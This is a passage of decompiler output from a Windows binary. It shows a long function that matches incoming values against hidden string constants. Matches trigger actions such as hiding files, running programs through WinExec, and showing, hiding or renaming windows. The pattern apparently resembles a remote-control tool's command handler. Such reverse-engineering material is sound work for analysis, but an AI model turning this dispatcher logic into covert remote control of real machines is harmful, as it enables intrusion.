var_278h = 0x47767c;\n        fcn.00405a84();\n        var_278h = 0;\n        var_27ch = 0x477683;\n        sub.ole32.dll_CoInitialize();\n        var_27ch = &fcn.004760a4::var_ch;\n        var_280h = 0x477694;\n        fcn.00405b28();\n        var_280h = 0x4776a4;\n        fcn.00405a44();\n        var_280h = 0x4776b1;\n        fcn.00405b28();\n        var_280h = 0x4776c0;\n        fcn.00405a84();\n        var_280h = &fcn.004760a4::var_10h;\n        var_284h = 0x4776d1;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_284h = 0x4776e1;\n        fcn.00405a44();\n        var_284h = 0x4776ee;\n        fcn.00405b28();\n        var_284h = 0x4776fd;\n        fcn.00405a84();\n        var_284h = 0x477708;\n        fcn.004055c8();\n        var_284h = 0x477716;\n        fcn.0046e3f0();\n        var_284h = 0x47771b;\n        sub.ole32.dll_CoUninitialize();\n    }\n    var_284h = &fcn.004760a4::var_34ch;\n    var_288h = 0x477734;\n    fcn.00405a44();\n    var_288h = 0x477744;\n    fcn.00405974();\n    if (uVar11) {\n        var_288h = 0x47775c;\n        fcn.00405a84();\n        var_288h = &fcn.004760a4::var_ch;\n        var_28ch = 0x47776d;\n        fcn.00405b28();\n        var_28ch = 0x47777d;\n        fcn.00405a44();\n        var_28ch = 0x47778a;\n        fcn.00405b28();\n        var_28ch = 0x477799;\n        fcn.00405a84();\n        var_28ch = 0x4777a4;\n        fcn.004055c8();\n        var_28ch = 0x4777b2;\n        fcn.0040a5a0();\n        var_28ch = 0x4777c0;\n        fcn.00405818();\n        var_28ch = 0x4777ce;\n        cVar1 = fcn.0046da2c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_28ch = 0x4777dc;\n            fcn.00475e2c();\n        }\n    }\n    var_28ch = &fcn.004760a4::var_354h;\n    var_290h = 0x4777f5;\n    fcn.00405a44();\n    var_290h = 0x477805;\n    fcn.00405974();\n    if (uVar11) {\n        var_290h = 0x477819;\n        fcn.00405a84();\n        var_290h = &fcn.004760a4::var_ch;\n        var_294h = 0x47782a;\n        fcn.00405b28();\n        var_294h = 0x47783a;\n        fcn.00405a44();\n        var_294h = 0x477847;\n        fcn.00405b28();\n        var_294h = 0x477856;\n        fcn.00405a84();\n        var_294h = 0x477861;\n        fcn.004055c8();\n        var_294h = 0x47786c;\n        cVar1 = fcn.0046da2c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_294h = 0x47787a;\n            fcn.00475e2c();\n        }\n    }\n    var_294h = &fcn.004760a4::var_358h;\n    var_298h = 0x477893;\n    fcn.00405a44();\n    var_298h = 0x4778a3;\n    fcn.00405974();\n    if (uVar11) {\n        var_298h = &fcn.004760a4::var_35ch;\n        var_29ch = 0x4778c7;\n        fcn.00405a44();\n        var_29ch = 0x4778d2;\n        cVar1 = fcn.0046da10();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_29ch = 0x4778ec;\n            fcn.00475e2c();\n        }\n        else {\n            var_29ch = 0x4778e0;\n            fcn.00475e2c();\n        }\n    }\n    var_29ch = &fcn.004760a4::var_360h;\n    var_2a0h = 0x477905;\n    fcn.00405a44();\n    var_2a0h = 0x477915;\n    fcn.00405974();\n    if (uVar11) {\n        var_2a0h = 0x477929;\n        fcn.00405a84();\n        var_2a0h = 0x477931;\n        cVar1 = fcn.0048c618();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_2a0h = 0x47d838;\n            var_2a4h = var_8h;\n            var_2a8h = 0x47d848;\n            var_2ach = 0x477952;\n            fcn.004058e0();\n            var_2ach = 0x47795d;\n            fcn.0046d36c();\n        }\n        var_2ach = 0x477967;\n        fcn.00475e2c();\n    }\n    var_2ach = &fcn.004760a4::var_368h;\n    var_2b0h = 0x477980;\n    fcn.00405a44();\n    var_2b0h = 0x477990;\n    fcn.00405974();\n    if (uVar11) {\n        var_2b0h = 0x4779a4;\n        fcn.00405a84();\n        var_2b0h = 2;\n        var_2b4h = 0x4779ae;\n        var_2b4h = fcn.004059dc();\n        var_2b8h = 0x4779b4;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_2b8h = &fcn.004760a4::var_36ch;\n    var_2bch = 0x4779cd;\n    fcn.00405a44();\n    var_2bch = 0x4779dd;\n    fcn.00405974();\n    if (uVar11) {\n        var_2bch = 0x4779f1;\n        fcn.00405a84();\n        var_2bch = 0x80;\n        var_2c0h = 0x4779fe;\n        var_2c0h = fcn.004059dc();\n        var_2c4h = 0x477a04;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_2c4h = 0x477a11;\n    fcn.00405974();\n    if (uVar11) {\n        var_2c4h = &fcn.004760a4::lpBuffer;\n        var_2c8h = 0x477a1f;\n        sub.kernel32.dll_GlobalMemoryStatus();\n        var_2c8h = 0x47d880;\n        var_2cch = 0x477a29;\n        fcn.0046e5b0();\n        var_2cch = 0x477a34;\n        fcn.00409d70();\n        var_2cch = var_374h;\n        var_2d0h = 0x47d2ec;\n        var_2d4h = &fcn.004760a4::var_378h;\n        var_380h = var_1f8h;\n        var_37ch = var_37ch & 0xffffff00;\n        uVar11 = 1;\n        var_2d8h = 0x477a6b;\n        fcn.0040af98(var_2d4h);\n        var_2d8h = var_378h;\n        var_2dch = 0x477a81;\n        fcn.004058e0();\n        var_2dch = 0x477a8c;\n        fcn.00475e2c();\n    }\n    var_2c4h = &fcn.004760a4::var_384h;\n    var_2c8h = 0x477aa5;\n    fcn.00405a44();\n    var_2c8h = 0x477ab5;\n    fcn.00405974();\n    if (uVar11) {\n        var_2c8h = 0x477ac2;\n        fcn.0046e724();\n        var_2c8h = 0x477ad8;\n        fcn.00405864();\n        var_2c8h = 0x477ae3;\n        fcn.00475e2c();\n    }\n    var_2c8h = &fcn.004760a4::var_390h;\n    var_2cch = 0x477afc;\n    fcn.00405a44();\n    var_2cch = 0x477b0c;\n    fcn.00405974();\n    if (uVar11) {\n        var_2cch = 0x477b20;\n        fcn.00405a84();\n        var_2d0h = 0x477b2c;\n        var_2cch = &stack0xfffffffc;\n        fcn.004846bc();\n        var_2d0h = 0x477b3f;\n        fcn.00475fd8(var_2cch);\n    }\n    var_2cch = &fcn.004760a4::var_398h;\n    var_2d0h = 0x477b59;\n    fcn.00405a44();\n    var_2d0h = 0x477b69;\n    fcn.00405974();\n    if (uVar11) {\n        var_2d0h = 0x477b81;\n        fcn.00405a84();\n        var_2d0h = &fcn.004760a4::var_ch;\n        var_2d4h = 0x477b92;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_2d4h = 0x477ba2;\n        fcn.00405a44();\n        var_2d4h = 0x477baf;\n        fcn.00405b28();\n        var_2d4h = 0x477bbe;\n        fcn.00405a84();\n        var_2d4h = 0x477bc9;\n        fcn.004055c8();\n        var_2d8h = 0x477bd2;\n        var_2d4h = &stack0xfffffffc;\n        fcn.00409edc();\n        var_2d8h = 0x477bdd;\n        fcn.0046de04();\n        var_2d8h = 0x477bf0;\n        fcn.00475fd8(var_2d4h);\n    }\n    var_2d4h = &fcn.004760a4::var_3a0h;\n    var_2d8h = 0x477c0a;\n    fcn.00405a44();\n    var_2d8h = 0x477c1a;\n    fcn.00405974();\n    if (uVar11) {\n        var_2d8h = 0x477c32;\n        fcn.00405a84();\n        var_2d8h = &fcn.004760a4::var_ch;\n        var_2dch = 0x477c43;\n        fcn.00405b28();\n        var_2dch = 0x477c53;\n        fcn.00405a44();\n        var_2dch = 0x477c60;\n        fcn.00405b28();\n        var_2dch = 0x477c6f;\n        fcn.00405a84();\n        var_2dch = 0x477c77;\n        iVar4 = fcn.00409edc();\n        uVar11 = iVar4 == 0;\n        if (0 < iVar4) {\n            iVar6 = 1;\n            iVar10 = iVar4;\n            do {\n                if (iVar4 == iVar6) {\n                    var_2dch = 0x477ce2;\n                    fcn.00409edc();\n                    var_2dch = 0x477ce7;\n                    fcn.00484388();\n                }\n                else {\n                    var_2d8h = &fcn.004760a4::var_3a4h;\n                    var_2e0h = 0x477c9c;\n                    fcn.00405b28();\n                    var_2e0h = 0x477cac;\n                    fcn.00405a44();\n                    var_2e0h = 0x477cb7;\n                    fcn.00409edc();\n                    var_2e0h = 0x477cbc;\n                    fcn.00484388();\n                    var_2e0h = 0x477cc9;\n                    fcn.00405b28();\n                    var_2e0h = 0x477cd8;\n                    fcn.00405a84();\n                }\n                iVar6 = iVar6 + 1;\n                iVar10 = iVar10 + -1;\n                uVar11 = iVar10 == 0;\n            } while (!uVar11);\n        }\n        var_2dch = 0x477cf5;\n        fcn.00475e2c();\n    }\n    var_2dch = &fcn.004760a4::var_3a8h;\n    var_2e0h = 0x477d0e;\n    fcn.00405a44();\n    var_2e0h = 0x477d1e;\n    fcn.00405974();\n    if (uVar11) {\n        var_2e0h = 0x477d36;\n        fcn.00405a84();\n        var_2e0h = 0x477d42;\n        var_1a8h = fcn.00404620();\n        var_2e4h = 0x477dc6;\n        var_2e8h = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004760a4::var_2e8h;\n        var_2ech = 0x477d64;\n        var_2e0h = &stack0xfffffffc;\n        (**(*var_1a8h + 0x2c))();\n        do {\n            var_2ech = 0x477d77;\n            (**(*var_1a8h + 0xc))();\n            var_2ech = 0x477d82;\n            fcn.00409edc();\n            var_2ech = 0x477d87;\n            fcn.00484388();\n            var_2ech = 0x477d94;\n            (**(*var_1a8h + 0x48))();\n            var_2ech = 0x477d9f;\n            iVar4 = (**(*var_1a8h + 0x14))();\n        } while (iVar4 != 0);\n        var_2ech = 0x477dad;\n        fcn.00475e2c();\n        *in_FS_OFFSET = var_2e8h;\n        var_2e0h = 0x477dcd;\n        var_2e4h = 0x477dc5;\n        fcn.00404650();\n        return;\n    }\n    var_2e0h = &fcn.004760a4::var_3b0h;\n    var_2e4h = 0x477de6;\n    fcn.00405a44();\n    var_2e4h = 0x477df6;\n    fcn.00405974();\n    if (uVar11) {\n        var_2e4h = 0x477e0a;\n        fcn.00405a84();\n        var_2e4h = 0x477e12;\n        fcn.00409edc();\n        var_2e4h = 0x477e17;\n        fcn.00484388();\n        var_2e4h = 0x477e21;\n        fcn.00475e2c();\n    }\n    var_2e4h = &fcn.004760a4::var_3b4h;\n    var_2e8h = 0x477e3a;\n    fcn.00405a44();\n    var_2e8h = 0x477e4a;\n    fcn.00405974();\n    if (uVar11) {\n        var_2e8h = 0x477e62;\n        fcn.00405a84();\n        var_2e8h = &fcn.004760a4::var_ch;\n        var_2ech = 0x477e73;\n        fcn.00405b28();\n        var_2ech = 0x477e83;\n        fcn.00405a44();\n        var_2ech = 0x477e90;\n        fcn.00405b28();\n        var_2ech = 0x477e9f;\n        fcn.00405a84();\n        var_2ech = &fcn.004760a4::var_10h;\n        var_2f0h = 0x477eb0;\n        fcn.00405b28();\n        var_2f0h = 0x477ec0;\n        fcn.00405a44();\n        var_2f0h = 0x477ecd;\n        fcn.00405b28();\n        var_2f0h = 0x477edc;\n        fcn.00405a84();\n        var_2f0h = &fcn.004760a4::var_14h;\n        var_2f4h = 0x477eed;\n        fcn.00405b28();\n        var_2f4h = 0x477efd;\n        fcn.00405a44();\n        var_2f4h = 0x477f0a;\n        fcn.00405b28();\n        var_2f4h = 0x477f19;\n        fcn.00405a84();\n        var_2f4h = &fcn.004760a4::var_18h;\n        var_2f8h = 0x477f2a;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_2f8h = 0x477f3a;\n        fcn.00405a44();\n        var_2f8h = 0x477f47;\n        fcn.00405b28();\n        var_2f8h = 0x477f56;\n        fcn.00405a84();\n        var_2f8h = 0x477f61;\n        fcn.004055c8();\n        var_2fch = 0x477f73;\n        var_2f8h = &stack0xfffffffc;\n        fcn.0046e9f8();\n        var_2fch = var_3bch;\n        var_300h = 0x47d2ec;\n        var_304h = 0x477f8f;\n        fcn.0046eab8();\n        var_304h = var_3c0h;\n        var_308h = 0x477fa5;\n        fcn.004058e0();\n        var_308h = 0x477fb6;\n        fcn.00475fd8(var_304h);\n    }\n    var_304h = &fcn.004760a4::var_3c4h;\n    var_308h = 0x477fd0;\n    fcn.00405a44();\n    var_308h = 0x477fe0;\n    fcn.00405974();\n    if (uVar11) {\n        var_308h = 0x477ff8;\n        fcn.00405a84();\n        var_308h = &fcn.004760a4::var_ch;\n        var_30ch = 0x47800e;\n        fcn.00405a44();\n        var_30ch = 0x478020;\n        fcn.00405a84();\n        var_30ch = &fcn.004760a4::var_10h;\n        var_310h = 0x478031;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_310h = 0x478041;\n        fcn.00405a44();\n        var_310h = 0x47804e;\n        fcn.00405b28();\n        var_310h = 0x47805d;\n        fcn.00405a84();\n        var_310h = 0x47806b;\n        fcn.0046e0dc();\n    }\n    var_310h = &fcn.004760a4::var_3c8h;\n    var_314h = 0x478084;\n    fcn.00405a44();\n    var_314h = 0x478094;\n    fcn.00405974();\n    if (uVar11) {\n        var_314h = 0x4780a8;\n        fcn.00405a84();\n        uVar11 = var_8h == 0 || var_8h == 4;\n        var_314h = &fcn.004760a4::var_3cch;\n        var_318h = 0x4780ca;\n        fcn.00405a44();\n        var_318h = var_3cch;\n        var_31ch = &fcn.004760a4::var_3d0h;\n        var_320h = 0x4780ea;\n        fcn.00405a44();\n        var_31ch = 0x4780f6;\n        fcn.0046e244();\n    }\n    var_31ch = &fcn.004760a4::var_3d4h;\n    var_320h = 0x47810f;\n    fcn.00405a44();\n    var_320h = 0x47811f;\n    fcn.00405974();\n    if (uVar11) {\n        var_320h = 0x478133;\n        fcn.00405a84();\n        uVar11 = var_8h == 0 || var_8h == 4;\n        var_320h = &fcn.004760a4::var_3d8h;\n        var_324h = 0x478155;\n        fcn.00405a44();\n        var_324h = var_3d8h;\n        var_328h = &fcn.004760a4::var_3dch;\n        var_32ch = 0x478175;\n        fcn.00405a44();\n        var_328h = 0x478181;\n        fcn.0046df5c();\n    }\n    var_328h = &fcn.004760a4::var_3e0h;\n    var_32ch = 0x47819a;\n    fcn.00405a44();\n    var_32ch = 0x4781aa;\n    fcn.00405974();\n    if (uVar11) {\n        var_32ch = 0x4781c2;\n        fcn.00405a84();\n        var_32ch = &fcn.004760a4::var_ch;\n        var_330h = 0x4781d3;\n        fcn.00405b28();\n        var_330h = 0x4781e3;\n        fcn.00405a44();\n        var_330h = 0x4781f0;\n        fcn.00405b28();\n        var_330h = 0x4781ff;\n        fcn.00405a84();\n        var_330h = &fcn.004760a4::var_10h;\n        var_334h = 0x478210;\n        fcn.00405b28();\n        var_334h = 0x478220;\n        fcn.00405a44();\n        var_334h = 0x47822d;\n        fcn.00405b28();\n        var_334h = 0x47823c;\n        fcn.00405a84();\n        var_334h = &fcn.004760a4::var_14h;\n        var_338h = 0x47824d;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_338h = 0x47825d;\n        fcn.00405a44();\n        var_338h = 0x47826a;\n        fcn.00405b28();\n        var_338h = 0x478279;\n        fcn.00405a84();\n        var_338h = var_8h;\n        var_33ch = 0x47828b;\n        fcn.0046f064(var_8h);\n    }\n    var_33ch = &fcn.004760a4::var_3e4h;\n    var_340h = 0x4782a4;\n    fcn.00405a44();\n    var_340h = 0x4782b4;\n    fcn.00405974();\n    if (uVar11) {\n        var_340h = 0x4782cc;\n        fcn.00405a84();\n        var_340h = &fcn.004760a4::var_ch;\n        var_344h = 0x4782dd;\n        fcn.00405b28();\n        var_344h = 0x4782ed;\n        fcn.00405a44();\n        var_344h = 0x4782fa;\n        fcn.00405b28();\n        var_344h = 0x478309;\n        fcn.00405a84();\n        var_344h = &fcn.004760a4::var_10h;\n        var_348h = 0x47831a;\n        fcn.00405b28();\n        var_348h = 0x47832a;\n        fcn.00405a44();\n        var_348h = 0x478337;\n        fcn.00405b28();\n        var_348h = 0x478346;\n        fcn.00405a84();\n        var_348h = &fcn.004760a4::var_14h;\n        var_34ch = 0x478357;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_34ch = 0x478367;\n        fcn.00405a44();\n        var_34ch = 0x478374;\n        fcn.00405b28();\n        var_34ch = 0x478383;\n        fcn.00405a84();\n        var_34ch = var_8h;\n        var_350h = 0x478395;\n        fcn.0046ee98(var_8h);\n    }\n    var_350h = &fcn.004760a4::var_3e8h;\n    var_354h = 0x4783ae;\n    fcn.00405a44();\n    var_354h = 0x4783be;\n    fcn.00405974();\n    if (uVar11) {\n        var_354h = 0x4783d6;\n        fcn.00405a84();\n        var_354h = &fcn.004760a4::var_ch;\n        var_358h = 0x4783e7;\n        fcn.00405b28();\n        var_358h = 0x4783f7;\n        fcn.00405a44();\n        var_358h = 0x478404;\n        fcn.00405b28();\n        var_358h = 0x478413;\n        fcn.00405a84();\n        var_358h = &fcn.004760a4::var_10h;\n        var_35ch = 0x478424;\n        fcn.00405b28();\n        var_35ch = 0x478434;\n        fcn.00405a44();\n        var_35ch = 0x478441;\n        fcn.00405b28();\n        var_35ch = 0x478450;\n        fcn.00405a84();\n        var_35ch = &fcn.004760a4::var_14h;\n        var_360h = 0x478461;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_360h = 0x478471;\n        fcn.00405a44();\n        var_360h = 0x47847e;\n        fcn.00405b28();\n        var_360h = 0x47848d;\n        fcn.00405a84();\n        var_360h = var_8h;\n        var_364h = 0x47849f;\n        fcn.0046ef80(var_8h);\n    }\n    var_364h = &fcn.004760a4::var_3ech;\n    var_368h = 0x4784b8;\n    fcn.00405a44();\n    var_368h = 0x4784c8;\n    fcn.00405974();\n    if (uVar11) {\n        var_368h = 0x4784e0;\n        fcn.00405a84();\n        var_368h = &fcn.004760a4::var_ch;\n        var_36ch = 0x4784f1;\n        fcn.00405b28();\n        var_36ch = 0x478501;\n        fcn.00405a44();\n        var_36ch = 0x47850e;\n        fcn.00405b28();\n        var_36ch = 0x47851d;\n        fcn.00405a84();\n        var_36ch = &fcn.004760a4::var_10h;\n        var_370h = 0x47852e;\n        fcn.00405b28();\n        var_370h = 0x47853e;\n        fcn.00405a44();\n        var_370h = 0x47854b;\n        fcn.00405b28();\n        var_370h = 0x47855a;\n        fcn.00405a84();\n        var_370h = &fcn.004760a4::var_14h;\n        var_374h = 0x47856b;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_374h = 0x47857b;\n        fcn.00405a44();\n        var_374h = 0x478588;\n        fcn.00405b28();\n        var_374h = 0x478597;\n        fcn.00405a84();\n        var_374h = 0x4785a2;\n        fcn.004055c8();\n        var_374h = 0x4785af;\n        fcn.00405974();\n        if (uVar11) {\n            var_378h = 0x4785bd;\n            var_374h = &stack0xfffffffc;\n            fcn.0046f390();\n            var_378h = &fcn.004760a4::var_3f0h;\n            var_37ch = 0x4785cf;\n            fcn.0046f5bc();\n            var_378h = 0x4785db;\n            fcn.00405818();\n            var_378h = 0x4785ec;\n            fcn.00475fd8(var_374h);\n        }\n        else {\n            var_378h = 0x4785fb;\n            var_374h = &stack0xfffffffc;\n            fcn.0046f390();\n            var_378h = 0x47860c;\n            fcn.00475fd8(var_374h);\n        }\n    }\n    var_374h = &fcn.004760a4::var_3fch;\n    var_378h = 0x478626;\n    fcn.00405a44();\n    var_378h = 0x478636;\n    fcn.00405974();\n    if (uVar11) {\n        var_378h = 0x47864a;\n        fcn.00405a84();\n        var_378h = NULL;\n        var_37ch = 0;\n        var_380h = 0x10;\n        var_384h = 0x478658;\n        var_384h = fcn.00409edc();\n        var_388h = 0x47865e;\n        sub.user32.dll_SendMessageA();\n    }\n    var_388h = &fcn.004760a4::var_400h;\n    var_38ch = 0x478677;\n    fcn.00405a44();\n    var_38ch = 0x478687;\n    fcn.00405974();\n    if (uVar11) {\n        var_38ch = 0x47869b;\n        fcn.00405a84();\n        var_38ch = 3;\n        var_390h = 0x4786a5;\n        var_390h = fcn.00409edc();\n        var_394h = 0x4786ab;\n        sub.user32.dll_ShowWindow();\n    }\n    var_394h = &fcn.004760a4::var_404h;\n    var_398h = 0x4786c4;\n    fcn.00405a44();\n    var_398h = 0x4786d4;\n    fcn.00405974();\n    if (uVar11) {\n        var_398h = 0x4786e8;\n        fcn.00405a84();\n        var_398h = 6;\n        var_39ch = 0x4786f2;\n        var_39ch = fcn.00409edc();\n        var_3a0h = 0x4786f8;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3a0h = &fcn.004760a4::var_408h;\n    var_3a4h = 0x478711;\n    fcn.00405a44();\n    var_3a4h = 0x478721;\n    fcn.00405974();\n    if (uVar11) {\n        var_3a4h = 0x478735;\n        fcn.00405a84();\n        var_3a4h = 0;\n        var_3a8h = 0x47873f;\n        var_3a8h = fcn.00409edc();\n        var_3ach = 0x478745;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3ach = &fcn.004760a4::var_40ch;\n    var_3b0h = 0x47875e;\n    fcn.00405a44();\n    var_3b0h = 0x47876e;\n    fcn.00405974();\n    if (uVar11) {\n        var_3b0h = 0x478782;\n        fcn.00405a84();\n        var_3b0h = 5;\n        var_3b4h = 0x47878c;\n        var_3b4h = fcn.00409edc();\n        var_3b8h = 0x478792;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3b8h = &fcn.004760a4::var_410h;\n    var_3bch = 0x4787ab;\n    fcn.00405a44();\n    var_3bch = 0x4787bb;\n    fcn.00405974();\n    if (uVar11) {\n        var_3bch = 0x4787cf;\n        fcn.00405a84();\n        var_3bch = &fcn.004760a4::var_ch;\n        var_3c0h = 0x4787e0;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3c0h = 0x4787f0;\n        fcn.00405a44();\n        var_3c0h = 0x4787fd;\n        fcn.00405b28();\n        var_3c0h = 0x47880c;\n        fcn.00405a84();\n        var_3c0h = 0x478817;\n        fcn.004055c8();\n        var_3c0h = 0x47881f;\n        var_3c0h = fcn.004059dc();\n        var_3c4h = 0x478828;\n        var_3c4h = fcn.00409edc();\n        var_3c8h = 0x47882e;\n        sub.user32.dll_SetWindowTextA();\n    }\n    var_3c8h = &fcn.004760a4::var_414h;\n    var_3cch = 0x478847;\n    fcn.00405a44();\n    var_3cch = 0x478857;\n    fcn.00405974();\n    if (uVar11) {\n        var_3cch = 0x47886f;\n        fcn.00405a84();\n        var_3cch = &fcn.004760a4::var_ch;\n        var_3d0h = 0x478880;\n        fcn.00405b28();\n        var_3d0h = 0x478890;\n        fcn.00405a44();\n        var_3d0h = 0x47889d;\n        fcn.00405b28();\n        var_3d0h = 0x4788ac;\n        fcn.00405a84();\n        var_3d0h = &fcn.004760a4::var_10h;\n        var_3d4h = 0x4788bd;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3d4h = 0x4788cd;\n        fcn.00405a44();\n        var_3d4h = 0x4788da;\n        fcn.00405b28();\n        var_3d4h = 0x4788e9;\n        fcn.00405a84();\n        var_3d4h = 0x4788f4;\n        fcn.004055c8();\n        var_3d8h = 0x478900;\n        var_3d4h = &stack0xfffffffc;\n        fcn.0048a480();\n        var_3d8h = 0x478911;\n        fcn.00475fd8(var_3d4h);\n    }\n    var_3d4h = &fcn.004760a4::var_41ch;\n    var_3d8h = 0x47892b;\n    fcn.00405a44();\n    var_3d8h = 0x47893b;\n    fcn.00405974();\n    if (uVar11) {\n        var_3d8h = 0x47894f;\n        fcn.00405a84();\n        var_3d8h = 0x478957;\n        fcn.0048a72c();\n    }\n    var_3d8h = &fcn.004760a4::var_420h;\n    var_3dch = 0x478970;\n    fcn.00405a44();\n    var_3dch = 0x478980;\n    fcn.00405974();\n    if (uVar11) {\n        var_3dch = 0x478994;\n        fcn.00405a84();\n        var_3dch = &fcn.004760a4::var_ch;\n        var_3e0h = 0x4789a5;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3e0h = 0x4789b5;\n        fcn.00405a44();\n        var_3e0h = 0x4789c2;\n        fcn.00405b28();\n        var_3e0h = 0x4789d1;\n        fcn.00405a84();\n        var_3e0h = 0x4789dc;\n        fcn.004055c8();\n        var_3e0h = 0x4789e7;\n        fcn.0048a7e0();\n    }\n    var_3e0h = &fcn.004760a4::var_424h;\n    var_3e4h = 0x478a00;\n    fcn.00405a44();\n    var_3e4h = 0x478a10;\n    fcn.00405974();\n    if (uVar11) {\n        var_3e4h = 0x478a24;\n        fcn.00405a84();\n        var_3e4h = 5;\n        var_3e8h = 0x478a2e;\n        var_3e8h = fcn.004059dc();\n        var_3ech = 0x478a34;\n        sub.kernel32.dll_WinExec();\n    }\n    var_3ech = &fcn.004760a4::var_428h;\n    var_3f0h = 0x478a4d;\n    fcn.00405a44();\n    var_3f0h = 0x478a5d;\n    fcn.00405974();\n    if (uVar11) {\n        var_3f0h = 0x478a75;\n        fcn.00405a84();\n        var_3f0h = &fcn.004760a4::var_ch;\n        var_3f4h = 0x478a86;\n        fcn.00405b28();\n        var_3f4h = 0x478a96;\n        fcn.00405a44();\n        var_3f4h = 0x478aa3;\n        fcn.00405b28();\n        var_3f4h = 0x478ab2;\n        fcn.00405a84();\n        var_3f4h = &fcn.004760a4::var_10h;\n        var_3f8h = 0x478ac3;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3f8h = 0x478ad3;\n        fcn.00405a44();\n        var_3f8h = 0x478ae0;\n        fcn.00405b28();\n        var_3f8h = 0x478aef;\n        fcn.00405a84();\n        var_3f8h = 0x478afa;\n        fcn.004055c8();\n        var_3fch = 0x478b06;\n        var_3f8h = &stack0xfffffffc;\n        fcn.00471640();\n        var_3fch = 0x478b17;\n        fcn.00475fd8(var_3f8h);\n    }\n    var_3f8h = &fcn.004760a4::var_430h;\n    var_3fch = 0x478b31;\n    fcn.00405a44();\n    var_3fch = 0x478b41;\n    fcn.00405974();\n    if (uVar11) {\n        var_3fch = 0x478b55;\n        fcn.00405a84();\n        var_3fch = 0x478b60;\n        fcn.0046d9e0();\n        var_3fch = 0x478b6e;\n        fcn.0046dd38();\n    }\n    var_3fch = &fcn.004760a4::var_438h;\n    var_400h = 0x478b87;\n    fcn.00405a44();\n    var_400h = 0x478b97;\n    fcn.00405974();\n    if (uVar11) {\n        var_400h = 0x478bab;\n        fcn.00405a84();\n        var_400h = 0x478bb6;\n        fcn.0046d9e0();\n        var_400h = 0x478bc4;\n        fcn.0046dc70();\n    }\n    var_400h = &fcn.004760a4::var_440h;\n    var_404h = 0x478bdd;\n    fcn.00405a44();\n    var_404h = 0x478bed;\n    fcn.00405974();\n    if (uVar11) {\n        var_404h = 0x478c01;\n        fcn.00405a84();\n        var_404h = 0x478c09;\n        fcn.004715b0();\n    }\n    var_404h = &fcn.004760a4::var_444h;\n    var_408h = 0x478c22;\n    fcn.00405a44();\n    var_408h = 0x478c32;\n    fcn.00405974();\n    if (uVar11) {\n        var_408h = 0x478c4a;\n        fcn.00405a84();\n        var_408h = &fcn.004760a4::var_ch;\n        var_40ch = 0x478c5b;\n        fcn.00405b28();\n        var_40ch = 0x478c6b;\n        fcn.00405a44();\n        var_40ch = 0x478c78;\n        fcn.00405b28();\n        var_40ch = 0x478c87;\n        fcn.00405a84();\n        var_40ch = &fcn.004760a4::var_10h;\n        var_410h = 0x478c98;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_410h = 0x478ca8;\n        fcn.00405a44();\n        var_410h = 0x478cb5;\n        fcn.00405b28();\n        var_410h = 0x478cc4;\n        fcn.00405a84();\n        var_410h = 0x478ccf;\n        fcn.004055c8();\n        var_410h = 0x478cd7;\n        fcn.004059dc();\n        var_410h = 0x478ce4;\n        fcn.00405728();\n        var_410h = var_448h;\n        var_414h = 0x478cf3;\n        var_414h = fcn.004059dc();\n        var_418h = 0x478cfc;\n        fcn.004059dc();\n        var_410h = 0x478d03;\n        fcn.00471850();\n    }\n    var_410h = &fcn.004760a4::var_44ch;\n    var_414h = 0x478d1c;\n    fcn.00405a44();\n    var_414h = 0x478d2c;\n    fcn.00405974();\n    if (uVar11) {\n        var_414h = 0x478d44;\n        fcn.00405a84();\n        var_414h = &fcn.004760a4::var_ch;\n        var_418h = 0x478d55;\n        fcn.00405b28();\n        var_418h = 0x478d65;\n        fcn.00405a44();\n        var_418h = 0x478d72;\n        fcn.00405b28();\n        var_418h = 0x478d81;\n        fcn.00405a84();\n        var_418h = &fcn.004760a4::var_10h;\n        var_41ch = 0x478d92;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_41ch = 0x478da2;\n        fcn.00405a44();\n        var_41ch = 0x478daf;\n        fcn.00405b28();\n        var_41ch = 0x478dbe;\n        fcn.00405a84();\n        var_41ch = 0x478dc9;\n        fcn.004055c8();\n        var_420h = 0x478dd5;\n        var_41ch = &stack0xfffffffc;\n        fcn.0046f744();\n        var_420h = 0x478de6;\n        fcn.00475fd8(var_41ch);\n    }\n    var_41ch = &fcn.004760a4::var_454h;\n    var_420h = 0x478e00;\n    fcn.00405a44();\n    var_420h = 0x478e10;\n    fcn.00405974();\n    if (uVar11) {\n        var_420h = 0x478e28;\n        fcn.00405a84();\n        var_420h = &fcn.004760a4::var_ch;\n        var_424h = 0x478e39;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_424h = 0x478e49;\n        fcn.00405a44();\n        var_424h = 0x478e56;\n        fcn.00405b28();\n        var_424h = 0x478e65;\n        fcn.00405a84();\n        var_424h = 0x478e70;\n        fcn.004055c8();\n        var_424h = 0x478e7b;\n        fcn.004055c8();\n        var_424h = 0x478e8d;\n        fcn.00405a84();\n        var_424h = &fcn.004760a4::var_ch;\n        var_428h = 0x478ea3;\n        fcn.00405a44();\n        var_428h = 0x47db4c;\n        var_42ch = 